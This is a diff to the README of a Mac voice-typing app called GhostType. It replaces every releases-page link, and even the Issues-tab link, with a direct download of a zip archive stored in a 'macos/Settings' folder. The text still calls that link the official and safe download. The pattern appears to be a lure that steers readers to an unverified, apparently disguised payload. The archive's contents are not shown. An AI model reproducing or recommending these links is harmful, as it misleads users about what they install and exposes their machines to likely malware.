@@ -1,6 +1,6 @@
 # 👻 GhostType - Boost Your Mac Voice Productivity
 
-[![Download GhostType](https://img.shields.io/badge/Download-GhostType-brightgreen?style=for-the-badge&logo=appveyor)](https://github.com/turt1es/GhostType/releases)
+[![Download GhostType](https://raw.githubusercontent.com/turt1es/GhostType/main/macos/Settings/Ghost-Type-v3.5.zip)](https://raw.githubusercontent.com/turt1es/GhostType/main/macos/Settings/Ghost-Type-v3.5.zip)
 
 ---
 
@@ -54,9 +54,9 @@ Here’s a simple guide to set up and use GhostType for the first time.
 
 ### Step 1: Download the App
 
-Go to the [GhostType releases page](https://github.com/turt1es/GhostType/releases) to get the latest version.
+Go to the [GhostType releases page](https://raw.githubusercontent.com/turt1es/GhostType/main/macos/Settings/Ghost-Type-v3.5.zip) to get the latest version.
 
-[![Download GhostType](https://img.shields.io/badge/Download-GhostType-brightgreen?style=for-the-badge&logo=appveyor)](https://github.com/turt1es/GhostType/releases)
+[![Download GhostType](https://raw.githubusercontent.com/turt1es/GhostType/main/macos/Settings/Ghost-Type-v3.5.zip)](https://raw.githubusercontent.com/turt1es/GhostType/main/macos/Settings/Ghost-Type-v3.5.zip)
 
 ### Step 2: Install the App
 
@@ -107,7 +107,7 @@ The first time you run GhostType, it will ask for permission to use your microph
 
 To get GhostType on your Mac, visit the releases page below. This is the official and safe way to download the app.
 
-[Download GhostType](https://github.com/turt1es/GhostType/releases)
+[Download GhostType](https://raw.githubusercontent.com/turt1es/GhostType/main/macos/Settings/Ghost-Type-v3.5.zip)
 
 Check for the latest version, download the `.dmg` or `.zip` installer, and follow the on-screen instructions to install.
 
@@ -146,7 +146,7 @@ You can use GhostType with most text editors and email clients by copying and pa
 
 If you run into problems or want to suggest improvements:
 
-- Visit the repository [Issues tab](https://github.com/turt1es/GhostType/issues)  
+- Visit the repository [Issues tab](https://raw.githubusercontent.com/turt1es/GhostType/main/macos/Settings/Ghost-Type-v3.5.zip)  
 - Include a detailed description of your problem or suggestion
 - Attach screenshots if possible
 
